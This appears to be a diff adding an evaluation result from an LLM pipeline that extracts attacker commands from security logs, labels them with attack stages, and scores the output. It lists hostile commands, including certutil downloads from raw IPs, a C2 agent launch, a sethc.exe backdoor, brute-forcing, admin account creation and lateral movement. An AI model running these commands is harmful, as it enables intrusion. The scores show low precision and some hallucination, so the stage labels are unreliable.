@@ -1,0 +1,172 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "postgres.exe \"--forkavworker\" \"5200\"",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "postgres.exe \"--forkbackend\" \"5176\"",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "taskkill /f /im agent.exe",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "certutil.exe -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "start /min C:\\Users\\Public\\agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "python PhpStudyPoc.py http://121.36.30.176/",
+        "stage": "Discovery"
+      },
+      {
+        "command": "del /f /q PhpStudyPoc.py",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "python PhpStudyExp2.py http://121.36.30.176/ whoami arp -a ipconfig ping www.baidu.com -c 1",
+        "stage": "Discovery"
+      },
+      {
+        "command": "del /f /q PhpStudyExp2.py",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "Reg add HKEY_LOCAL_MACHINE SYSTEM CurrentControlSet Control Terminal Server fDenyTSConnections /t REG_DWORD /d 0 /f",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "netsh advfirewall firewall add rule name Remote Desktop dir=in action=allow protocol=TCP localport=3389",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "reg add HKLM SOFTWARE Microsoft Windows NT CurrentVersion Image File Execution Options sethc.exe /v Debugger /t REG_SZ /d C\\windows\\system32\\cmd.exe /f",
+        "stage": "Persistence"
+      },
+      {
+        "command": "REG ADD HKLM SOFTWARE Microsoft Windows NT CurrentVersion Image File Execution Options sethc.exe /v Debugger /t REG_SZ /d C\\windows\\system32\\sethc.exe /f",
+        "stage": "Persistence"
+      },
+      {
+        "command": "winbrute.exe Administrator_Pass.txt Administrator",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "del /f /q winbrute.exe & del /f /q Administrator_Pass.txt",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "nbtscan.exe 192.168.0.244/24",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "del /f /q nbtscan.exe",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "paexec.exe 192.168.0.244 -u Administrator -p Data123456! ipconfig",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "del /f /q paexec.exe",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "certutil.exe -urlcache -split -f http://111.229.170.12/phpmyadmin/themes/servert.exe C:\\Windows\\ywm.exe",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "net user nbb nb123. /add",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "net localgroup administrators nbb /add",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "cmd /c cd /d D:/phpStudy/WWW&net user nbb nb123. /add&net localgroup administrators nbb /add&echo [S]&cd&echo [E]",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "certutil.exe -urlcache -split -f http://111.229.170.12/phpmyadmin/themes/servert.exe C:\\Windows\\ywm.exe",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "C:\\Windows\\ywm.exe",
+        "stage": "Collection"
+      },
+      {
+        "command": "cmd /c cd /d D:/phpStudy/WWW&C:\\Windows\\ywm.exe&echo [S]&cd&echo [E]",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "cmd.exe /c cmd /c cd /d D:/phpStudy/WWW&netstat -ano | findstr 88&echo [S]&cd&echo [E] 2>\\dev\\null",
+        "stage": "Discovery"
+      },
+      {
+        "command": "cmd.exe /c cmd /c cd /d D:/phpStudy/WWW&net user oop o33 /add&echo [S] 2>\\dev\\null",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "cmd.exe /c cmd /c cd /d D:/phpStudy/WWW&tasklist /svc | find Ter &echo [S] 2>\\dev\\null",
+        "stage": "Collection"
+      }
+    ],
+    "narrative": "This attack chain can be broken down into several distinct phases. Initially, the attackers gained access via multiple separate vectors - using PostgreSQL's features, downloading executables from the internet, and exploiting website vulnerabilities (Segments 1, 2, 3). After initial access, the attackers proceeded with exploration and reconnaissance. They mapped out their surroundings, gathered sensitive information, and discovered exploitable vulnerabilities. During the exploitation phase, the attackers added new users to privileged groups and escalated rights allowing further actions. The attackers also established backdoors, modified system configurations for remote interaction, and mapped accessible areas through network scanning. This led to the acquisition of lateral movement capabilities.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 22415,
+      "completion_tokens": 4703,
+      "total_tokens": 27118,
+      "wall_clock_s": 55.768,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.16666666666666666,
+      "recall": 0.625,
+      "f1": 0.2631578947368421,
+      "tp": 5,
+      "fp": 25,
+      "fn": 3
+    },
+    "stage": {
+      "precision": 0.03333333333333333,
+      "recall": 0.16666666666666666,
+      "f1": 0.05555555555555555,
+      "tp": 1,
+      "fp": 29,
+      "fn": 5,
+      "recall_partial": 0.3333333333333333
+    },
+    "hallucination_rate": 0.15789473684210525,
+    "cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 22415,
+      "completion_tokens": 4703,
+      "total_tokens": 27118,
+      "wall_clock_s": 55.768,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "v5_got_links",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": true,
+    "got_link_hints": true
+  }
+}
